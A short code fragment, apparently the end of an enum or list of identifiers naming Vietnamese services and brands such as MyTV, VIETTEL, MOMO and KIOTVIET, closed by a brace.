    MyTV,
    GalaxyPlay,
    ONPLUS,
    FPTSHOP,
    VIETTEL,
    POPEYES,
    ALFRESCOS,
    VAYVND,
    KIOTVIET,
    MOMO,
    AHAMOVE,
    cashbar,
    shopiness,
    kiot,
    dkvt,
    bestInc
}

